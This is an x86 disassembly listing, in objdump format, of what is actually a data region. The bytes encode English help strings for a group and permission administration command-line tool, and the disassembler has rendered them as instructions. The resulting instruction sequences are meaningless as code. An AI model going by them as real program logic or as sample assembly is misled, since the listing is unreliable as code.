  40607c:	fs gs jae 0x4060e3
  406080:	jb     0x4060eb
  406082:	jo     0x4060f8
  406084:	imul   ebp,DWORD PTR [edi+0x6e],0x632f2820
  40608b:	outs   dx,DWORD PTR ds:[esi]
  40608c:	ins    BYTE PTR es:[edi],dx
  40608d:	ins    BYTE PTR es:[edi],dx
  40608e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406093:	outs   dx,BYTE PTR ds:[esi]
  406094:	cmp    al,BYTE PTR [ebx+0x6f]
  406097:	ins    BYTE PTR es:[edi],dx
  406098:	ins    BYTE PTR es:[edi],dx
  406099:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40609e:	outs   dx,BYTE PTR ds:[esi]
  40609f:	push   ebp
  4060a0:	push   edx
  4060a1:	dec    ecx
  4060a2:	and    BYTE PTR [eax+eiz*1+0x2f],bh
  4060a6:	jae    0x40610d
  4060a8:	jb     0x406120
  4060aa:	gs jb  0x4060e7
  4060ad:	push   ebx
  4060ae:	gs jb  0x406127
  4060b1:	gs jb  0x406109
  4060b4:	push   edx
  4060b5:	dec    ecx
  4060b6:	sub    DWORD PTR ds:0x2020200a,ecx
  4060bc:	and    BYTE PTR [eax],ah
  4060be:	and    BYTE PTR [eax],ah
  4060c0:	and    BYTE PTR [eax],ah
  4060c2:	and    BYTE PTR [eax],ah
  4060c4:	and    BYTE PTR [ebx+0x68],al
  4060c7:	popa   
  4060c8:	outs   dx,BYTE PTR ds:[esi]
  4060c9:	addr16 gs jae 0x4060ed
  4060cd:	je     0x406137
  4060cf:	and    BYTE PTR gs:[ebp+eiz*2+0x73],ah
  4060d4:	arpl   WORD PTR [edx+0x69],si
  4060d7:	jo     0x40614d
  4060d9:	imul   ebp,DWORD PTR [edi+0x6e],0x726f6620
  4060e0:	and    BYTE PTR [ecx+0x20],ah
  4060e3:	arpl   WORD PTR [edi+0x6c],bp
  4060e6:	ins    BYTE PTR es:[edi],dx
  4060e7:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4060ec:	outs   dx,BYTE PTR ds:[esi]
  4060ed:	sub    eax,0x6576656c
  4060f2:	ins    BYTE PTR es:[edi],dx
  4060f3:	and    BYTE PTR [edi+0x72],ch
  4060f6:	and    BYTE PTR [ecx+0x6e],ch
  4060f9:	jae    0x40616f
  4060fb:	popa   
  4060fc:	outs   dx,BYTE PTR ds:[esi]
  4060fd:	arpl   WORD PTR [ebp+0x2d],sp
  406100:	ins    BYTE PTR es:[edi],dx
  406101:	gs jbe 0x406169
  406104:	ins    BYTE PTR es:[edi],dx
  406105:	and    BYTE PTR [edi+0x72],ah
  406108:	outs   dx,DWORD PTR ds:[esi]
  406109:	jne    0x40617b
  40610b:	cs or  eax,0x200a0d0a
  406111:	and    BYTE PTR [eax],ah
  406113:	and    BYTE PTR [eax],ah
  406115:	and    BYTE PTR [eax],ah
  406117:	and    BYTE PTR [edi],ch
  406119:	and    BYTE PTR fs:[bx+0x72],ah
  40611e:	outs   dx,DWORD PTR ds:[esi]
  40611f:	jne    0x406191
  406121:	dec    ecx
  406122:	fs outs dx,BYTE PTR gs:[esi]
  406125:	je     0x406190
  406127:	je     0x4061a2
  406129:	and    BYTE PTR [eax],ch
  40612b:	das    
  40612c:	arpl   WORD PTR [edi+0x6c],bp
  40612f:	ins    BYTE PTR es:[edi],dx
  406130:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406135:	outs   dx,BYTE PTR ds:[esi]
  406136:	cmp    al,BYTE PTR [ebx+0x6f]
  406139:	ins    BYTE PTR es:[edi],dx
  40613a:	ins    BYTE PTR es:[edi],dx
  40613b:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406140:	outs   dx,BYTE PTR ds:[esi]
  406141:	push   ebp
  406142:	push   edx
  406143:	dec    ecx
  406144:	and    BYTE PTR [eax+eiz*1+0x2f],bh
  406148:	jae    0x4061af
  40614a:	jb     0x4061c2
  40614c:	gs jb  0x406189
  40614f:	push   ebx
  406150:	gs jb  0x4061c9
  406153:	gs jb  0x4061ab
  406156:	push   edx
  406157:	dec    ecx
  406158:	sub    DWORD PTR ds:0x2020200a,ecx
  40615e:	and    BYTE PTR [eax],ah
  406160:	and    BYTE PTR [eax],ah
  406162:	and    BYTE PTR [eax],ah
  406164:	and    BYTE PTR [eax],ah
  406166:	and    BYTE PTR [ebp+eiz*2+0x6c],al
  40616a:	gs je  0x4061d2
  40616d:	jae    0x40618f
  40616f:	popa   
  406170:	and    BYTE PTR [edi+0x72],ah
  406173:	outs   dx,DWORD PTR ds:[esi]
  406174:	jne    0x4061e6
  406176:	and    BYTE PTR [esi+0x72],ah
  406179:	outs   dx,DWORD PTR ds:[esi]
  40617a:	ins    DWORD PTR es:[edi],dx
  40617b:	and    BYTE PTR [eax+ebp*2+0x65],dh
  40617f:	and    BYTE PTR [ebx+0x6f],ah
  406182:	ins    BYTE PTR es:[edi],dx
  406183:	ins    BYTE PTR es:[edi],dx
  406184:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406189:	outs   dx,BYTE PTR ds:[esi]
  40618a:	sub    eax,0x6576656c
  40618f:	ins    BYTE PTR es:[edi],dx
  406190:	and    BYTE PTR [edi+0x72],ch
  406193:	and    BYTE PTR [ecx+0x6e],ch
  406196:	jae    0x40620c
  406198:	popa   
  406199:	outs   dx,BYTE PTR ds:[esi]
  40619a:	arpl   WORD PTR [ebp+0x2d],sp
  40619d:	ins    BYTE PTR es:[edi],dx
  40619e:	gs jbe 0x406206
  4061a1:	ins    BYTE PTR es:[edi],dx
  4061a2:	cs or  eax,0x200a0d0a
  4061a8:	and    BYTE PTR [eax],ah
  4061aa:	and    BYTE PTR [eax],ah
  4061ac:	and    BYTE PTR [eax],ah
  4061ae:	and    BYTE PTR [edi],ch
  4061b0:	sub    esp,DWORD PTR [bx+si]
  4061b3:	addr16 jb 0x406225
  4061b6:	jne    0x406228
  4061b8:	dec    ecx
  4061b9:	fs outs dx,BYTE PTR gs:[esi]
  4061bc:	je     0x406227
  4061be:	je     0x406239
  4061c0:	and    BYTE PTR [ebp+0x65],ch
  4061c3:	ins    DWORD PTR es:[edi],dx
  4061c4:	bound  esp,QWORD PTR [ebp+0x72]
  4061c7:	dec    ecx
  4061c8:	fs outs dx,BYTE PTR gs:[esi]
  4061cb:	je     0x406236
  4061cd:	je     0x406248
  4061cf:	and    BYTE PTR [eax],ch
  4061d1:	das    
  4061d2:	arpl   WORD PTR [edi+0x6c],bp
  4061d5:	ins    BYTE PTR es:[edi],dx
  4061d6:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4061db:	outs   dx,BYTE PTR ds:[esi]
  4061dc:	cmp    al,BYTE PTR [ebx+0x6f]
  4061df:	ins    BYTE PTR es:[edi],dx
  4061e0:	ins    BYTE PTR es:[edi],dx
  4061e1:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4061e6:	outs   dx,BYTE PTR ds:[esi]
  4061e7:	push   ebp
  4061e8:	push   edx
  4061e9:	dec    ecx
  4061ea:	and    BYTE PTR [eax+eiz*1+0x2f],bh
  4061ee:	jae    0x406255
  4061f0:	jb     0x406268
  4061f2:	gs jb  0x40622f
  4061f5:	push   ebx
  4061f6:	gs jb  0x40626f
  4061f9:	gs jb  0x406251
  4061fc:	push   edx
  4061fd:	dec    ecx
  4061fe:	sub    DWORD PTR ds:0x2020200a,ecx
  406204:	and    BYTE PTR [eax],ah
  406206:	and    BYTE PTR [eax],ah
  406208:	and    BYTE PTR [eax],ah
  40620a:	and    BYTE PTR [eax],ah
  40620c:	and    BYTE PTR [ecx+0x64],al
  40620f:	fs jae 0x406232
  406212:	popa   
  406213:	and    BYTE PTR [ebp+0x73],dh
  406216:	gs jb  0x406239
  406219:	outs   dx,DWORD PTR ds:[esi]
  40621a:	jb     0x40623c
  40621c:	popa   
  40621d:	and    BYTE PTR [edi+0x72],ah
  406220:	outs   dx,DWORD PTR ds:[esi]
  406221:	jne    0x406293
  406223:	and    BYTE PTR [edi+ebp*2+0x20],dh
  406227:	popa   
  406228:	outs   dx,BYTE PTR ds:[esi]
  406229:	and    BYTE PTR [ebp+0x78],ah
  40622c:	imul   esi,DWORD PTR [ebx+0x74],0x20676e69
  406233:	addr16 jb 0x4062a5
  406236:	jne    0x4062a8
  406238:	cs or  eax,0x200a0d0a
  40623e:	and    BYTE PTR [eax],ah
  406240:	and    BYTE PTR [eax],ah
  406242:	and    BYTE PTR [eax],ah
  406244:	and    BYTE PTR [edi],ch
  406246:	addr16 sub eax,0x6f726720
  40624c:	jne    0x4062be
  40624e:	dec    ecx
  40624f:	fs outs dx,BYTE PTR gs:[esi]
  406252:	je     0x4062bd
  406254:	je     0x4062cf
  406256:	and    BYTE PTR [ebp+0x65],ch
  406259:	ins    DWORD PTR es:[edi],dx
  40625a:	bound  esp,QWORD PTR [ebp+0x72]
  40625d:	dec    ecx
  40625e:	fs outs dx,BYTE PTR gs:[esi]
  406261:	je     0x4062cc
  406263:	je     0x4062de
  406265:	and    BYTE PTR [eax],ch
  406267:	das    
  406268:	arpl   WORD PTR [edi+0x6c],bp
  40626b:	ins    BYTE PTR es:[edi],dx
  40626c:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406271:	outs   dx,BYTE PTR ds:[esi]
  406272:	cmp    al,BYTE PTR [ebx+0x6f]
  406275:	ins    BYTE PTR es:[edi],dx
  406276:	ins    BYTE PTR es:[edi],dx
  406277:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40627c:	outs   dx,BYTE PTR ds:[esi]
  40627d:	push   ebp
  40627e:	push   edx
  40627f:	dec    ecx
  406280:	and    BYTE PTR [eax+eiz*1+0x2f],bh
  406284:	jae    0x4062eb
  406286:	jb     0x4062fe
  406288:	gs jb  0x4062c5
  40628b:	push   ebx
  40628c:	gs jb  0x406305
  40628f:	gs jb  0x4062e7
  406292:	push   edx
  406293:	dec    ecx
  406294:	sub    DWORD PTR ds:0x2020200a,ecx
  40629a:	and    BYTE PTR [eax],ah
  40629c:	and    BYTE PTR [eax],ah
  40629e:	and    BYTE PTR [eax],ah
  4062a0:	and    BYTE PTR [eax],ah
  4062a2:	and    BYTE PTR [edx+0x65],dl
  4062a5:	ins    DWORD PTR es:[edi],dx
  4062a6:	outs   dx,DWORD PTR ds:[esi]
  4062a7:	jbe    0x40630e
  4062a9:	jae    0x4062cb
  4062ab:	popa   
  4062ac:	and    BYTE PTR [ebp+0x73],dh
  4062af:	gs jb  0x4062d2
  4062b2:	outs   dx,DWORD PTR ds:[esi]
  4062b3:	jb     0x4062d5
  4062b5:	addr16 jb 0x406327
  4062b8:	jne    0x40632a
  4062ba:	and    BYTE PTR [esi+0x72],ah
  4062bd:	outs   dx,DWORD PTR ds:[esi]
  4062be:	ins    DWORD PTR es:[edi],dx
  4062bf:	and    BYTE PTR [ecx+0x6e],ah
  4062c2:	and    BYTE PTR [ebp+0x78],ah
  4062c5:	imul   esi,DWORD PTR [ebx+0x74],0x20676e69
  4062cc:	addr16 jb 0x40633e
  4062cf:	jne    0x406341
  4062d1:	cs or  eax,0x200a0d0a
  4062d7:	and    BYTE PTR [eax],ah
  4062d9:	and    BYTE PTR [eax],ah
  4062db:	and    BYTE PTR [eax],ah
  4062dd:	and    BYTE PTR [edi],ch
  4062df:	ins    DWORD PTR es:[edi],dx
  4062e0:	and    BYTE PTR [edi+0x72],ah
  4062e3:	outs   dx,DWORD PTR ds:[esi]
  4062e4:	jne    0x406356
  4062e6:	dec    ecx
  4062e7:	fs outs dx,BYTE PTR gs:[esi]
  4062ea:	je     0x406355
  4062ec:	je     0x406367
  4062ee:	and    BYTE PTR [ebx+0x6d],bl
  4062f1:	gs ins DWORD PTR es:[edi],dx
  4062f3:	bound  esp,QWORD PTR [ebp+0x72]
  4062f6:	dec    ecx
  4062f7:	fs outs dx,BYTE PTR gs:[esi]
  4062fa:	je     0x406365
  4062fc:	je     0x406377
  4062fe:	pop    ebp
  4062ff:	and    BYTE PTR [eax],ch
  406301:	das    
  406302:	arpl   WORD PTR [edi+0x6c],bp
  406305:	ins    BYTE PTR es:[edi],dx
  406306:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40630b:	outs   dx,BYTE PTR ds:[esi]
  40630c:	cmp    al,BYTE PTR [ebx+0x6f]
  40630f:	ins    BYTE PTR es:[edi],dx
  406310:	ins    BYTE PTR es:[edi],dx
  406311:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406316:	outs   dx,BYTE PTR ds:[esi]
  406317:	push   ebp
  406318:	push   edx
  406319:	dec    ecx
  40631a:	and    BYTE PTR [eax+eiz*1+0x2f],bh
  40631e:	jae    0x406385
  406320:	jb     0x406398
  406322:	gs jb  0x40635f
  406325:	push   ebx
  406326:	gs jb  0x40639f
  406329:	gs jb  0x406381
  40632c:	push   edx
  40632d:	dec    ecx
  40632e:	sub    DWORD PTR ds:0x2020200a,ecx
  406334:	and    BYTE PTR [eax],ah
  406336:	and    BYTE PTR [eax],ah
  406338:	and    BYTE PTR [eax],ah
  40633a:	and    BYTE PTR [eax],ah
  40633c:	inc    ebx
  40633d:	push   0x736b6365
  406342:	and    BYTE PTR [ebp+0x78],ah
  406345:	jo     0x4063b3
  406347:	imul   esp,DWORD PTR [ebx+0x69],0x6e612074
  40634e:	and    BYTE PTR fs:[ecx+0x6d],ch
  406352:	jo     0x4063c0
  406354:	imul   esp,DWORD PTR [ebx+0x69],0x72672074
  40635b:	outs   dx,DWORD PTR ds:[esi]
  40635c:	jne    0x4063ce
  40635e:	and    BYTE PTR [ebp+0x65],ch
  406361:	ins    DWORD PTR es:[edi],dx
  406362:	bound  esp,QWORD PTR [ebp+0x72]
  406365:	jae    0x4063cf
  406367:	imul   esi,DWORD PTR [eax+0x20],0x6f666e69
  40636e:	jb     0x4063dd
  406370:	popa   
  406371:	je     0x4063dc
  406373:	outs   dx,DWORD PTR ds:[esi]
  406374:	outs   dx,BYTE PTR ds:[esi]
  406375:	and    BYTE PTR [esi+0x6f],ah
  406378:	jb     0x40639a
  40637a:	popa   
  40637b:	and    BYTE PTR [ebx+0x70],dh
  40637e:	arpl   WORD PTR gs:[ecx+0x66],bp
  406382:	imul   esp,DWORD PTR [ebp+0x64],0x6f726720
  406389:	jne    0x4063fb
  40638b:	and    BYTE PTR [edi+0x72],ch
  40638e:	and    BYTE PTR [ebp+0x73],dh
  406391:	gs jb  0x4063c2
  406394:	or     eax,0x200a0d0a
  406399:	and    BYTE PTR [eax],ah
  40639b:	and    BYTE PTR [eax],ah
  40639d:	and    BYTE PTR [eax],ah
  40639f:	and    BYTE PTR [edi],ch
  4063a1:	popa   
  4063a2:	and    BYTE PTR [ebx+0x6e],bl
  4063a5:	popa   
  4063a6:	ins    DWORD PTR es:[edi],dx
  4063a7:	gs jae 0x40641a
  4063aa:	popa   
  4063ab:	arpl   WORD PTR [ebp+0x5d],sp
  4063ae:	and    BYTE PTR [eax],ch
  4063b0:	das    
  4063b1:	arpl   WORD PTR [edi+0x6c],bp
  4063b4:	ins    BYTE PTR es:[edi],dx
  4063b5:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4063ba:	outs   dx,BYTE PTR ds:[esi]
  4063bb:	cmp    al,BYTE PTR [ebx+0x6f]
  4063be:	ins    BYTE PTR es:[edi],dx
  4063bf:	ins    BYTE PTR es:[edi],dx
  4063c0:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4063c5:	outs   dx,BYTE PTR ds:[esi]
  4063c6:	push   ebp
  4063c7:	push   edx
  4063c8:	dec    ecx
  4063c9:	and    BYTE PTR [eax+eiz*1+0x2f],bh
  4063cd:	jae    0x406434
  4063cf:	jb     0x406447
  4063d1:	gs jb  0x40640e
  4063d4:	push   ebx
  4063d5:	gs jb  0x40644e
  4063d8:	gs jb  0x406430
  4063db:	push   edx
  4063dc:	dec    ecx
  4063dd:	sub    DWORD PTR ds:0x2020200a,ecx
  4063e3:	and    BYTE PTR [eax],ah
  4063e5:	and    BYTE PTR [eax],ah
  4063e7:	and    BYTE PTR [eax],ah
  4063e9:	and    BYTE PTR [eax],ah
  4063eb:	inc    esp
  4063ec:	imul   esi,DWORD PTR [ebx+0x70],0x7379616c
  4063f3:	and    BYTE PTR [ecx+0x6e],ch
  4063f6:	outs   dx,WORD PTR ds:[esi]
  4063f8:	jb     0x406467
  4063fa:	popa   
  4063fb:	je     0x406466
  4063fd:	outs   dx,DWORD PTR ds:[esi]
  4063fe:	outs   dx,BYTE PTR ds:[esi]
  4063ff:	and    BYTE PTR [ecx+0x62],ah
  406402:	outs   dx,DWORD PTR ds:[esi]
  406403:	jne    0x406479
  406405:	and    BYTE PTR [edi+0x68],dh
  406408:	popa   
  406409:	je     0x40642b
  40640b:	outs   dx,DWORD PTR ds:[esi]
  40640c:	jo     0x406482
  40640e:	imul   ebp,DWORD PTR [edi+0x6e],0x72612073
  406415:	and    BYTE PTR gs:[esi+0x61],dh
  406419:	ins    BYTE PTR es:[edi],dx
  40641a:	imul   esp,DWORD PTR [eax+eiz*1+0x66],0x7420726f
  406422:	push   0x6f632065
  406427:	ins    DWORD PTR es:[edi],dx
  406428:	ins    DWORD PTR es:[edi],dx
  406429:	popa   
  40642a:	outs   dx,BYTE PTR ds:[esi]
  40642b:	and    BYTE PTR fs:[ecx+0x74],ah
  40642f:	and    BYTE PTR [eax+ebp*2+0x65],dh
  406433:	and    BYTE PTR [ebx+0x6f],ah
  406436:	ins    BYTE PTR es:[edi],dx
  406437:	ins    BYTE PTR es:[edi],dx
  406438:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40643d:	outs   dx,BYTE PTR ds:[esi]
  40643e:	sub    eax,0x6576656c
  406443:	ins    BYTE PTR es:[edi],dx
  406444:	and    BYTE PTR [edi+0x72],ch
  406447:	and    BYTE PTR [eax+ebp*2+0x65],dh
  40644b:	and    BYTE PTR [ecx+0x6e],ch
  40644e:	jae    0x4064c4
  406450:	popa   
  406451:	outs   dx,BYTE PTR ds:[esi]
  406452:	arpl   WORD PTR [ebp+0x2d],sp
  406455:	ins    BYTE PTR es:[edi],dx
  406456:	gs jbe 0x4064be
  406459:	ins    BYTE PTR es:[edi],dx
  40645a:	sub    al,0x20
  40645c:	popa   
  40645d:	jae    0x40647f
  40645f:	fs gs je 0x4064c8
  406463:	jb     0x4064d2
  406465:	imul   ebp,DWORD PTR [esi+0x65],0x79622064
  40646c:	and    BYTE PTR [eax+ebp*2+0x65],dh
  406470:	and    BYTE PTR [edi],ch
  406472:	arpl   WORD PTR [edi+0x6c],bp
  406475:	ins    BYTE PTR es:[edi],dx
  406476:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40647b:	outs   dx,BYTE PTR ds:[esi]
  40647c:	and    BYTE PTR [edi+0x72],ch
  40647f:	and    BYTE PTR [edi],ch
  406481:	jae    0x4064e8
  406483:	jb     0x4064fb
  406485:	gs jb  0x4064a8
  406488:	jo     0x4064eb
  40648a:	jb     0x4064ed
  40648c:	ins    DWORD PTR es:[edi],dx
  40648d:	gs je  0x4064f5
  406490:	jb     0x4064c0
  406492:	and    BYTE PTR [ecx+0x66],cl
  406495:	and    BYTE PTR [esi+0x61],ch
  406498:	ins    DWORD PTR es:[edi],dx
  406499:	gs jae 0x40650c
  40649c:	popa   
  40649d:	arpl   WORD PTR [ebp+0x20],sp
  4064a0:	imul   esi,DWORD PTR [ebx+0x20],0x20746f6e
  4064a7:	jae    0x406519
  4064a9:	arpl   WORD PTR gs:[ecx+0x66],bp
  4064ad:	imul   esp,DWORD PTR [ebp+0x64],0x696c202c
  4064b4:	jae    0x40652a
  4064b6:	jae    0x4064d8
  4064b8:	je     0x406522
  4064ba:	and    BYTE PTR gs:[ecx+0x76],ah
  4064be:	popa   
  4064bf:	imul   ebp,DWORD PTR [ecx+eiz*2+0x62],0x6e20656c
  4064c7:	popa   
  4064c8:	ins    DWORD PTR es:[edi],dx
  4064c9:	gs jae 0x40653c
  4064cc:	popa   
  4064cd:	arpl   WORD PTR [ebp+0x73],sp
  4064d0:	and    BYTE PTR [ecx+0x74],ah
  4064d3:	and    BYTE PTR [eax+ebp*2+0x65],dh
  4064d7:	and    BYTE PTR [ebx+0x70],dh
  4064da:	arpl   WORD PTR gs:[ecx+0x66],bp
  4064de:	imul   esp,DWORD PTR [ebp+0x64],0x76656c20
  4064e5:	gs ins BYTE PTR es:[edi],dx
  4064e7:	and    BYTE PTR cs:[ecx+0x66],cl
  4064eb:	and    BYTE PTR [ecx+0x20],ah
  4064ee:	outs   dx,BYTE PTR ds:[esi]
  4064ef:	popa   
  4064f0:	ins    DWORD PTR es:[edi],dx
  4064f1:	gs jae 0x406564
  4064f4:	popa   
  4064f5:	arpl   WORD PTR [ebp+0x20],sp
  4064f8:	imul   esi,DWORD PTR [ebx+0x20],0x63657073
  4064ff:	imul   esp,DWORD PTR [esi+0x69],0x202c6465
  406506:	ins    BYTE PTR es:[edi],dx
  406507:	imul   esi,DWORD PTR [ebx+0x74],0x68742073
  40650e:	and    BYTE PTR gs:[ecx+0x76],ah
  406512:	popa   
  406513:	imul   ebp,DWORD PTR [ecx+eiz*2+0x62],0x6120656c
  40651b:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  40651f:	outs   dx,BYTE PTR ds:[esi]
  406520:	jae    0x406542
  406522:	outs   dx,WORD PTR ds:[esi]
  406524:	jb     0x406546
  406526:	je     0x406590
  406528:	popa   
  406529:	je     0x40654b
  40652b:	outs   dx,BYTE PTR ds:[esi]
  40652c:	popa   
  40652d:	ins    DWORD PTR es:[edi],dx
  40652e:	gs jae 0x4065a1
  406531:	popa   
  406532:	arpl   WORD PTR [ebp+0x20],sp
  406535:	popa   
  406536:	je     0x406558
  406538:	je     0x4065a2
  40653a:	and    BYTE PTR gs:[ebx+0x70],dh
  40653e:	arpl   WORD PTR gs:[ecx+0x66],bp
  406542:	imul   esp,DWORD PTR [ebp+0x64],0x76656c20
  406549:	gs ins BYTE PTR es:[edi],dx
  40654b:	cs or  eax,0x200a0d0a
  406551:	and    BYTE PTR [eax],ah
  406553:	and    BYTE PTR [eax],ah
  406555:	and    BYTE PTR [eax],ah
  406557:	das    
  406558:	popa   
  406559:	sub    esp,DWORD PTR [eax]
  40655b:	outs   dx,BYTE PTR ds:[esi]
  40655c:	popa   
  40655d:	ins    DWORD PTR es:[edi],dx
  40655e:	gs jae 0x4065d1
  406561:	popa   
  406562:	arpl   WORD PTR [ebp+0x20],sp
  406565:	je     0x4065d6
  406567:	imul   esp,DWORD PTR [ebp+0x6e],0x20
  40656b:	popa   
  40656c:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  406570:	outs   dx,BYTE PTR ds:[esi]
  406571:	and    BYTE PTR [ecx+0x64],ch
  406574:	outs   dx,BYTE PTR gs:[esi]
  406576:	je     0x4065e1
  406578:	je     0x4065f3
  40657a:	and    BYTE PTR [eax],ch
  40657c:	inc    ecx
  40657d:	dec    esp
  40657e:	dec    esp
  40657f:	dec    edi
  406580:	push   edi
  406581:	and    BYTE PTR [eax+eiz*1+0x44],bh
  406585:	inc    ebp
  406586:	dec    esi
  406587:	pop    ecx
  406588:	sub    DWORD PTR [eax],esp
  40658a:	sub    BYTE PTR [edi],ch
  40658c:	arpl   WORD PTR [edi+0x6c],bp
  40658f:	ins    BYTE PTR es:[edi],dx
  406590:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406595:	outs   dx,BYTE PTR ds:[esi]
  406596:	cmp    al,BYTE PTR [ebx+0x6f]
  406599:	ins    BYTE PTR es:[edi],dx
  40659a:	ins    BYTE PTR es:[edi],dx
  40659b:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4065a0:	outs   dx,BYTE PTR ds:[esi]
  4065a1:	push   ebp
  4065a2:	push   edx
  4065a3:	dec    ecx
  4065a4:	and    BYTE PTR [eax+eiz*1+0x2f],bh
  4065a8:	jae    0x40660f
  4065aa:	jb     0x406622
  4065ac:	gs jb  0x4065e9
  4065af:	push   ebx
  4065b0:	gs jb  0x406629
  4065b3:	gs jb  0x40660b
  4065b6:	push   edx
  4065b7:	dec    ecx
  4065b8:	sub    DWORD PTR ds:0x2020200a,ecx
  4065be:	and    BYTE PTR [eax],ah
  4065c0:	and    BYTE PTR [eax],ah
  4065c2:	and    BYTE PTR [eax],ah
  4065c4:	and    BYTE PTR [eax],ah
  4065c6:	inc    ecx
  4065c7:	fs fs jae 0x4065eb
  4065cb:	jo     0x406632
  4065cd:	jb     0x40663c
  4065cf:	imul   esi,DWORD PTR [ebx+0x73],0x736e6f69
  4065d6:	and    BYTE PTR [esi+0x6f],ah
  4065d9:	jb     0x4065fb
  4065db:	popa   
  4065dc:	and    BYTE PTR [ebp+0x73],dh
  4065df:	gs jb  0x406602
  4065e2:	outs   dx,DWORD PTR ds:[esi]
  4065e3:	jb     0x406605
  4065e5:	addr16 jb 0x406657
  4065e8:	jne    0x40665a
  4065ea:	and    BYTE PTR [edi+ebp*2+0x20],dh
  4065ee:	popa   
  4065ef:	and    BYTE PTR [ecx+0x6e],ch
  4065f2:	jae    0x406668
  4065f4:	popa   
  4065f5:	outs   dx,BYTE PTR ds:[esi]
  4065f6:	arpl   WORD PTR [ebp+0x2d],sp
  4065f9:	ins    BYTE PTR es:[edi],dx
  4065fa:	gs jbe 0x406662
  4065fd:	ins    BYTE PTR es:[edi],dx
  4065fe:	sub    al,0x20
  406600:	arpl   WORD PTR [edi+0x6c],bp
  406603:	ins    BYTE PTR es:[edi],dx
  406604:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406609:	outs   dx,BYTE PTR ds:[esi]
  40660a:	sub    eax,0x6576656c
  40660f:	ins    BYTE PTR es:[edi],dx
  406610:	sub    al,0x20
  406612:	outs   dx,DWORD PTR ds:[esi]
  406613:	jb     0x406635
  406615:	jo     0x406689
  406617:	outs   dx,DWORD PTR ds:[esi]
  406618:	push   0x65
  40661a:	arpl   WORD PTR [ebp+ebp*1+0x6c],si
  40661e:	gs jbe 0x406686
  406621:	ins    BYTE PTR es:[edi],dx
  406622:	and    BYTE PTR [edi+0x72],ah
  406625:	outs   dx,DWORD PTR ds:[esi]
  406626:	jne    0x406698
  406628:	cs or  eax,0x200a0d0a
  40662e:	and    BYTE PTR [eax],ah
  406630:	and    BYTE PTR [eax],ah
  406632:	and    BYTE PTR [eax],ah
  406634:	and    BYTE PTR [edi],ch
  406636:	popa   
  406637:	sub    eax,0x6d616e20
  40663c:	gs jae 0x4066af
  40663f:	popa   
  406640:	arpl   WORD PTR [ebp+0x20],sp
  406643:	je     0x4066b4
  406645:	imul   esp,DWORD PTR [ebp+0x6e],0x20
  406649:	popa   
  40664a:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  40664e:	outs   dx,BYTE PTR ds:[esi]
  40664f:	and    BYTE PTR [ecx+0x64],ch
  406652:	outs   dx,BYTE PTR gs:[esi]
  406654:	je     0x4066bf
  406656:	je     0x4066d1
  406658:	and    BYTE PTR [eax],ch
  40665a:	inc    ecx
  40665b:	dec    esp
  40665c:	dec    esp
  40665d:	dec    edi
  40665e:	push   edi
  40665f:	and    BYTE PTR [eax+eiz*1+0x44],bh
  406663:	inc    ebp
  406664:	dec    esi
  406665:	pop    ecx
  406666:	sub    DWORD PTR [eax],esp
  406668:	sub    BYTE PTR [edi],ch
  40666a:	arpl   WORD PTR [edi+0x6c],bp
  40666d:	ins    BYTE PTR es:[edi],dx
  40666e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406673:	outs   dx,BYTE PTR ds:[esi]
  406674:	cmp    al,BYTE PTR [ebx+0x6f]
  406677:	ins    BYTE PTR es:[edi],dx
  406678:	ins    BYTE PTR es:[edi],dx
  406679:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40667e:	outs   dx,BYTE PTR ds:[esi]
  40667f:	push   ebp
  406680:	push   edx
  406681:	dec    ecx
  406682:	and    BYTE PTR [eax+eiz*1+0x2f],bh
  406686:	jae    0x4066ed
  406688:	jb     0x406700
  40668a:	gs jb  0x4066c7
  40668d:	push   ebx
  40668e:	gs jb  0x406707
  406691:	gs jb  0x4066e9
  406694:	push   edx
  406695:	dec    ecx
  406696:	sub    DWORD PTR ds:0x2020200a,ecx
  40669c:	and    BYTE PTR [eax],ah
  40669e:	and    BYTE PTR [eax],ah
  4066a0:	and    BYTE PTR [eax],ah
  4066a2:	and    BYTE PTR [eax],ah
  4066a4:	push   edx
  4066a5:	gs ins DWORD PTR es:[edi],dx
  4066a7:	outs   dx,DWORD PTR ds:[esi]
  4066a8:	jbe    0x40670f
  4066aa:	jae    0x4066cc
  4066ac:	jo     0x406713
  4066ae:	jb     0x40671d
  4066b0:	imul   esi,DWORD PTR [ebx+0x73],0x736e6f69
  4066b7:	and    BYTE PTR [esi+0x6f],ah
  4066ba:	jb     0x4066dc
  4066bc:	popa   
  4066bd:	and    BYTE PTR [ebp+0x73],dh
  4066c0:	gs jb  0x4066e3
  4066c3:	outs   dx,DWORD PTR ds:[esi]
  4066c4:	jb     0x4066e6
  4066c6:	addr16 jb 0x406738
  4066c9:	jne    0x40673b
  4066cb:	and    BYTE PTR [esi+0x72],ah
  4066ce:	outs   dx,DWORD PTR ds:[esi]
  4066cf:	ins    DWORD PTR es:[edi],dx
  4066d0:	and    BYTE PTR [ecx+0x20],ah
  4066d3:	imul   ebp,DWORD PTR [esi+0x73],0x636e6174
  4066da:	gs sub eax,0x6576656c
  4066e0:	ins    BYTE PTR es:[edi],dx
  4066e1:	sub    al,0x20
  4066e3:	arpl   WORD PTR [edi+0x6c],bp
